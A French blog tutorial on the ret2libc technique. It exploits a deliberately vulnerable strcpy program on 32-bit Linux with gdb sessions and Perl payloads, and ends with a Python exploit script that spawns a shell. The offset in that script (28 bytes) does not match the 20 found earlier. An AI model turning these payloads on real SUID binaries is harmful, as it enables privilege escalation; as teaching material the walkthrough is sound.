---
title: "Retour à la libc"
date: 2015-05-24 15:38:43
author: "Pixis"
layout: post
permalink: /retour-a-la-libc/
disqus_identifier: 0000-0000-0000-0008
description: "Article sur le retour à la libc, avec la théorie et des exemples"
cover: assets/uploads/2015/05/retli.jpg
tags:
  - "User Land"
  - Linux
---

Bonjour, nous avons vu dans la série d'articles précédents comment fonctionnait la mémoire d'un processus au sein d'un système Unix. Grâce à cette compréhension, nous avons exposé une vulnérabilité très connue qu'est le dépassement de tampon en utilisant la pile (_buffer overflow stack based_).

<!--more-->

## Rappels

Pour rappel, le buffer overflow est une vulnérabilité présente lorsque le programmeur ne vérifie pas la taille d'une variable fournie par l'utilisateur, et qu'il stocke cette variable en mémoire. Il est alors possible pour l'attaquant d'entrer une valeur de taille supérieure à ce qui était prévu, et lorsque cette valeur (appelée _buffer_) est copiée en mémoire, elle dépasse de l'espace qui lui était alloué (dépassement de tampon).

Cela peut engendrer une erreur de segmentation car ce dépassement va probablement écraser la sauvegarde du registre EIP (sauvegarde effectuée afin que lorsque la fonction en cours se termine, le processeur retrouve l'adresse de l'instruction suivant l'appel de cette fonction), donc comme EIP est partiellement ou totalement écrasé, les chances sont fortes pour que cette nouvelle valeur pointe soit vers une zone mémoire non autorisée en lecture, soit vers une zone mémoire contenant des instructions non valides.

Cependant, si l'attaquant fourni une adresse mémoire soigneusement choisie pour pointer vers un code malveillant (placé dans le buffer, dans nos exemples précédents, d'où le _stack based_), alors le flow d'exécution du programme peut être modifié, et l'attaquant peut faire ce qu'on appelle une **escalade de privilèges** (sous réserve que le programme en question appartenait à un utilisateur avec des droits plus élevés et que le programme était SUID, c'est à dire qu'il s'exécutait avec les droits du propriétaire de ce logiciel)

## Protections contre les BoF

Dans l'[article sur les buffer overflows](/buffer-overflow/), nous avions placé notre code malveillant (shellcode) dans le buffer, qui se trouvait quelque part dans la pile. Nous aurions pu le placer à d'autres endroits (dans une variable d'environnement, par exemple, qui se trouve également sur la pile lors de l'exécution du programme), pourvu que nous puissions trouver son adresse mémoire.

Certaines protections existent pour se protéger des buffer overflows. Une des premières barrières a été de rendre la pile non exécutable. Ainsi, l'attaquant place son shellcode dans le buffer, ou dans une variable d'environnement (placée sur la pile), mais lorsque le flow d'exécution est redirigé vers son code, celui-ci ne s'exécute pas.

Voici une commande permettant de connaitre les flags de la pile :

```bash
$ readelf -l add32 | grep GNU_STACK

Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
```


_J'ai ajouté la ligne qui indique le nom des colonnes pour une meilleure compréhension._

On remarque la présence des deux flags RW (Read - Write), mais l'absence du flag E (Execute), donc la pile n'est pas exécutable. Mais alors, comment pouvons nous exploiter l'oubli de vérification de la taille du buffer ?

## Contournement : ret2libc

L'idée est d'utiliser des fonctions déjà programmée, contenues dans la **libc**, à notre avantage (Libraire C, libraire contenant toutes les fonctions standards telles que printf, scanf, system, strlen, strcpy &#8230;). Avant, nous faisions quelque chose comme cela pour lancer notre shellcode (shellcode qui ne faisait rien d'autre qu'un appel système à execve avec comme paramètre `"/bin/sh"`)


![img](/assets/uploads/2015/03/img_54f78559832ab.png?w=640" alt="" data-recalc-dims="1)


Cependant, comme nous ne pouvons plus exécuter le shellcode situé sur la pile, nous allons changer notre technique, et nous allons appeler directement la fonction `system()` de la libc, en lui fournissant comme argument la chaine de caractère `"/bin/sh"`.


### Organisation de la pile


Pour cela, il faut bien comprendre [le fonctionnement de la pile](/stack-introduction/) et la préparer soigneusement pour que l'appel soit fait correctement. Pour nous aider, nous allons étudier le comportement de la pile avec un programme de test :


```c
#include <stdlib.h>

int main(void) {
    char command[] = "/bin/sh";
    system(command);
    return EXIT_SUCCESS;
}
```

Ce programme lance la commande system(), avec en argument la chaine de caractères `"/bin/sh"`. Si nous le compilons et le désassemblons au sein de gdb, voici le résultat obtenu

```bash
$ gcc -m32 appel_system.c -o appel_system
$ gdb appel_system
gdb$ disass main
Dump of assembler code for function main:
   0x0804841c <+0>:     push   ebp
   0x0804841d <+1>:     mov    ebp,esp
   0x0804841f <+3>:     and    esp,0xfffffff0
   0x08048422 <+6>:     sub    esp,0x20
   0x08048425 <+9>:     mov    DWORD PTR [esp+0x18],0x6e69622f
   0x0804842d <+17>:    mov    DWORD PTR [esp+0x1c],0x68732f
   0x08048435 <+25>:    lea    eax,[esp+0x18]
   0x08048439 <+29>:    mov    DWORD PTR [esp],eax
   0x0804843c <+32>:    call   0x8048300 <system@plt>
   0x08048441 <+37>:    mov    eax,0x0
   0x08048446 <+42>:    leave
   0x08048447 <+43>:    ret
End of assembler dump.
```

Nous voyons le call vers la fonction system() à la ligne +32. Aux lignes +9 et +17, nous voyons que notre chaine de caractères `"/bin/sh"`; est enregistrée à esp+0x18, sachant que 0x6e69622f est la représentation ASCII de `/bin`; et 0x68732f de `/sh`; (en Little Endian). Ensuite, à la ligne +25, l'adresse valant esp+0x18 est placée dans EAX, puis EAX est mis au sommet de la pile, pointé par ESP. Donc si nous plaçons un breakpoint sur le call, nous devrions voir notre chaine de caractères sur le sommet de la pile :

```bash
gdb$ b *0x0804843c
Breakpoint 1 at 0x804843c
gdb$ r
--------------------------------------------------------------------------[regs]
  EAX: 0xBFFFF388  EBX: 0xB7FCEFF4  ECX: 0x308D58E7  EDX: 0x00000001  o d I t S z a p c
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF398  ESP: 0xBFFFF370  EIP: 0x0804843C
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
--------------------------------------------------------------------------

=> 0x804843c <main+32>:    call   0x8048300 <system@plt>
   0x8048441 <main+37>:    mov    eax,0x0
   0x8048446 <main+42>:    leave
   0x8048447 <main+43>:    ret
   0x8048448:    nop
   0x8048449:    nop
   0x804844a:    nop
   0x804844b:    nop
--------------------------------------------------------------------------------

Breakpoint 1, 0x0804843c in main ()
gdb$ x/xw $esp
0xbffff370:    0xbffff388
gdb$ x/s 0xbffff388
0xbffff388:     "/bin/sh"
```


_Vous aurez peut-être remarqué que certaines informations que nous n'avons pas explicitement demandées sont tout de même affichées. C'est parce que j'utilise un .gdbinit particulier, qui m'affiche les instructions à venir ainsi que l'état des registres à chaque fois que j'avance dans l'exécution du programme._


Tout se passe comme prévu. Voici à quoi ressemble la pile à l'état actuel :


![etat de la pile](/assets/uploads/2015/05/img_5562042840252.png)


Ensuite, le call va être effectué. Rappelez-vous que l'instruction call vers une adresse est une simplification d'écriture, car elle équivaut à deux instructions :


```asm
call <adresse>
; est un alias de
PUSH EIP
JMP <adresse>
```


Vous vous doutiez sûrement du fait qu'un JMP était effectué, puisque l’instruction qui sera exécutée juste après est celle située à l'adresse fournie au call, cependant, il ne faut surtout pas oublier que EIP est poussé sur la pile afin de retenir l'instruction qui suivait le call, instruction qui sera remise dans EIP à la fin de la fonction appelée. Pour en avoir le cœur net, vérifions-le dans gdb. Retenons dans un coin de notre tête l'adresse de l'instruction qui suit le call system (0x8048441)


```bash
gdb$ si
[...]
0x08048300 in system@plt ()
gdb$ x/4xw $esp
0xbffff36c:    0x08048441    0xbffff388    0xbffff444    0xbffff44c
```


Nous avons suivi le call, et nous remarquons bien que l'ancien EIP 0x8048441 a été poussé sur la pile, il est donc juste au dessus de l'adresse de notre chaine "/bin/sh", et la suite du programme peut s'exécuter normalement. La pile ressemble donc à ça :


  [![img_5562044bc46a3](/assets/uploads/2015/05/img_5562044bc46a3.png)](/assets/uploads/2015/05/img_5562044bc46a3.png)


Maintenant que nous avons une bonne compréhension de la pile lors d'un appel à la fonction system("/bin/sh"), nous pouvons nous attaquer à l'exploitation d'un buffer overflow avec un retour à la libc.


### Exploitation - Théorie



Comme nous l'avons évoqué tout à l'heure, nous pouvons écraser la valeur de retour de la fonction dans laquelle se trouve la vulnérabilité. Lorsque la fonction se termine et fait appel à l'instruction RET, c'est en fait un POP EIP qui est effectué, suivi d'un JMP EIP. Le POP EIP prend la valeur qui est sur le sommet de la pile, et l'enregistre dans le registre EIP. Comme nous contrôlons cette valeur (grâce au BoF), nous contrôlons le JMP EIP.


[![img_556205b53cf28](/assets/uploads/2015/05/img_556205b53cf28.png)](/assets/uploads/2015/05/img_556205b53cf28.png)


Nous allons donc simuler un appel valide à la fonction system() en arrangeant la pile correctement pour que la fonction system() lance un shell. Nous avons vu dans l'exemple de l'appel à system() quel devait être l'état de la pile lorsque la fonction system() débutait :


[![img_556206de318fa](/assets/uploads/2015/05/img_556206de318fa.png)](/assets/uploads/2015/05/img_556206de318fa.png)


En effet, il faut qu'il y ait l'adresse de retour sur le dessus de la pile, et juste en dessous l'adresse de la chaine de caractère passée en argument à la fonction system(). Donc si nous exploitons le buffer overflow, et que nous fournissons l'adresse de la fonction system() dans la sauvegarde de EIP, voici quel devrait être l'état de la pile :


[![img_5562069a3bd6f](/assets/uploads/2015/05/img_5562069a3bd6f.png)](/assets/uploads/2015/05/img_5562069a3bd6f.png)


Comme nous allons lancer un shell via l'appel à system(), l'adresse de retour ne nous importe pas vraiment, donc nous pourrons mettre n'importe quoi.


Pour pouvoir mettre la pile dans cet état, il faudra donc envoyer au programme un buffer sous cette forme :


```text
[ buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ]
```



### Exploitation - Par l'exemple

C'était un long préambule, mais il était nécessaire pour pouvoir bien comprendre les rouages de cette technique. Sans plus attendre, nous allons l'exploiter avec un exemple simple

Je précise que j'ai fait [une vidéo](https://www.youtube.com/watch?v=M7NQfGobQNo){:target="blank"} qui permet d'illustrer ce même exemple !

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void func(char *arg)
{
    char buffer[8];
    strcpy(buffer,arg);
    printf("%s\n", buffer);
}

int main(int argc, char *argv[])
{
    if(argc != 2) printf("binary <chaine>\n");
    else func(argv[1]);
    return 0;
}
```


Ce code est le même que celui fourni en exemple dans le deuxième cas pratique de l'article sur les [buffer overflows](/buffer-overflow). Voici le comportement attendu de ce programme :


```bash
$ ./ret2libc hackndo
hackndo
$ ./ret2libc hackndoisawesome
hackndoisawesome
Segmentation fault
```


Je ne vais pas revenir sur les bases de l'overflow expliquées dans les articles précédents. Dans gdb, nous trouvons le nombre exact de caractères à envoyer pour réécrire EIP


```bash
gdb$ r $(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"')
AAAAAAAAAAAAAAAAAAAAﾭ�

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  EAX: 0x00000019  EBX: 0xB7FCEFF4  ECX: 0xB7FCF4E0  EDX: 0xB7FD0360  o d I t s Z a P c
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x41414141  ESP: 0xBFFFF360  EIP: 0xDEADBEEF
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
Cannot access memory at address 0xdeadbeef
0xdeadbeef in ?? ()
```


Il faut donc 20 octets de buffer, puis les 4 octets suivants remplacent la sauvegarde de `EIP`, ce qui fait qu'au retour de la fonction (l'instruction `RET` effectuant un `POP EIP` puis `JMP EIP`), le programme plante car il ne peut pas accéder à l'adresse fournie, `0xdeadbeef` ici.


Rappelons que nous voulons mettre la stack dans l'état suivant :


[![img_5562069a3bd6f](/assets/uploads/2015/05/img_5562069a3bd6f.png)](/assets/uploads/2015/05/img_5562069a3bd6f.png)


Nous venons de trouver l'adresse de la sauvegarde de `EIP`, il s'agit maintenant de trouver l'adresse de la fonction `system()`.  Pour cela, rien de plus simple, il suffit de lancer la commande `print system` ou `p system` dans gdb


```bash
gdb$ p system
$1 = {<text variable, no debug info>} 0xb7ea9e20 <system>
```


L'adresse de la fonction `system` est donc `0xb7ea9e20`.


Vient alors le tour de la chaine de caractère `"/bin/sh"`. Dans un premier temps, il peut être possible de trouver cette chaine de caractères de manière un peu brutale mais rapide (merci <strong>Mastho</strong> pour l'astuce !), via la commande suivante dans gdb :


```bash
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xb7fa92e8
warning: Unable to access target memory at 0xb7fd03f0, halting search.
1 pattern found.
```


Cette commande effectue une recherche dans une plage mémoire commençant au début de la fonction `__libc_start_main()` (appelée avant notre fonction `main`), et d'une taille de 99 999 999 octets (Pour être sûr). Oui la méthode est violente mais elle a le mérite d'être rapide ! Nous avons donc un endroit dans la mémoire où se situe la chaine recherchée, à l'adresse `0xb7fa92e8` ! Pour nous en convaincre :


```bash
(gdb) x/s 0xb7fa92e8
0xb7fa92e8:     "/bin/sh"
```


Pratique non ?


Si jamais cette chaine (ou une autre que vous recherchez) n'est pas présente dans la mémoire du binaire (par exemple la chaine `"I Love Ricard"`, au hasard, mais on va continuer avec `"/bin/sh"`), il existe divers moyens de la stocker, nous allons par exemple la stocker dans une variable d'environnement


```bash
gdb$ set environment HACKNDO=/bin/sh
gdb$ x/s *((char **) environ+7)
0xbffff6ca:     "HACKNDO=/bin/sh"
gdb$ x/s 0xbffff6d2
0xbffff6d2:     "/bin/sh"
```


Une fois stockée, avec un tout petit peu de tâtonnement, nous trouvons son adresse en mémoire, que nous allons utiliser pour la suite.


Nous avons donc maintenant tous les éléments nécessaire pour pouvoir lancer notre attaque ret2libc, avec un payload comme suit :


```text
[ 20 x "A" ] [ 0xb7ea9e20 ] [ OSEF ] [ 0xbffff6d2 ]
```


Voici le résultat :


```bash
gdb$ r "$(perl -e 'print "A"x20 . "\x20\x9e\xea\xb7" . "OSEF" . "\xd2\xf6\xff\xbf"')"
AAAAAAAAAAAAAAAAAAAA ��OSEF����
$ 
```


On a obtenu notre shell ! Félicitations !


Pour rendre cette exploitation plus propre, au lieu de mettre une adresse de retour aléatoire, nous pourrions mettre l'adresse de la fonction `exit()`. Voici rapidement comment ça se passe


```bash
gdb$ r "$(perl -e 'print "A"x20 . "\x20\x9e\xea\xb7" . "OSEF" . "\xd2\xf6\xff\xbf"')"
AAAAAAAAAAAAAAAAAAAA ��OSEF����

$ exit

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  EAX: 0x00000000  EBX: 0xB7FCEFF4  ECX: 0xBFFFF288  EDX: 0x00000000  o d I t S z A P c
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x41414141  ESP: 0xBFFFF344  EIP: 0x4645534F
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
Cannot access memory at address 0x4645534f
0x4645534f in ?? ()
```


Cherchons alors l'adresse de `exit()`


```bash
gdb$ p exit
$3 = {<text variable, no debug info>} 0xb7e9d530 <exit>
gdb$ r "$(perl -e 'print "A"x20 . "\x20\x9e\xea\xb7" . "\x30\xd5\xe9\xb7" . "\xd2\xf6\xff\xbf"')"
AAAAAAAAAAAAAAAAAAAA ��0������

$ exit
[Inferior 1 (process 10896) exited normally]
--------------------------------------------------------------------------[regs]
  EAX:Error while running hook_stop:
No registers.
gdb$ 
```


Lorsque nous faisons un exit du premier shell avec notre adresse de retour `"OSEF"`, nous avons une faute de segmentation (qui sera loguée, donc qui laisse des traces), tandis qu'en cherchant l'adresse de la fonction `exit()`, et en la plaçant en adresse de retour, la sortie du shell que nous avons forké se fait sans erreur, comme le montre le message **exited normally**.


Comme ce n'est pas très lisible, voici un code python qui permet d'exploiter ce binaire avec les éléments que nous avons mis en place


```python
import os
import struct

# Addresses de system et "/bin/sh"
system   = 0xb7ea9e20
exit     = 0xb7e9d530
bin_sh   = 0xbffff6d2

# Buffer
payload  = "A"*28

# Overwrite sEBP (Valeur aleatoire)
payload += "HNDO"

# system("bin/sh") avec l'adresse de retour vers exit()
payload += struct.pack("I", system)
payload += struct.pack("I", exit)
payload += struct.pack("I", bin_sh)

os.system("./ret2libc \"%s\"" % payload)
```


J'espère que cet article aura été utile et clair. Rappelez-vous que ce ne sont que des explications à titre éducatives, pour mieux comprendre votre environnement et les dangers qui existent afin d'en prendre conscience, de les comprendre, et de s'en prémunir.


Pour ouvrir une perspective, sachez que pour les binaires 64bits, les paramètres des fonctions sont passés par les registres (du moins les 6 premiers. S'il y en a plus, ils sont mis sur la pile). Ainsi, il ne faut plus créer une fausse pile pour rendre l'appel valide, mais il faut initialiser les bons registres avec les bonnes valeurs !


Je vous invite également à vous renseigner sur l'[ASLR](http://fr.wikipedia.org/wiki/Address_space_layout_randomization){:target="blank"}, qui est une technique permettant de se prémunir (partiellement) de ces attaques.
